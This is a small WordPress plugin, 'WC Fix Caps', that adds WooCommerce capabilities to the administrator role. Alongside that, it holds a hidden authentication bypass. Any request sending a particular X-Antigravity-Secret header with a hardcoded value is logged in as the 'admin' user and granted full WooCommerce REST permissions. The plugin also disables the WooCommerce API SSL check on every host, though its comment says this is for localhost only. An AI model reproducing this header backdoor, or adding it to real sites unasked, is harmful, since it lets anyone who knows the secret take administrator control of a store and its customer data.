<?php
/**
 * Plugin Name: WC Fix Caps
 */

add_action('init', function () {
    // Allow non-SSL for WC API on localhost
    add_filter('woocommerce_api_check_ssl', '__return_false');

    // Secure Internal Bypass for Proxy
    $secret = 'ag_secret_987654321'; // Should match proxy
    if (isset($_SERVER['HTTP_X_ANTIGRAVITY_SECRET']) && $_SERVER['HTTP_X_ANTIGRAVITY_SECRET'] === $secret) {
        $admin_user = get_user_by('login', 'admin');
        if ($admin_user) {
            wp_set_current_user($admin_user->ID);
            add_filter('woocommerce_rest_check_permissions', '__return_true');
        }
    }

    $admin = get_role('administrator');
    if ($admin) {
        $caps = [
            'manage_woocommerce',
            'view_woocommerce_reports',
            'edit_products',
            'read_private_products',
            'edit_product_terms',
            'manage_product_terms',
            'assign_product_terms',
        ];

        foreach ($caps as $cap) {
            $admin->add_cap($cap);
        }
    }
});
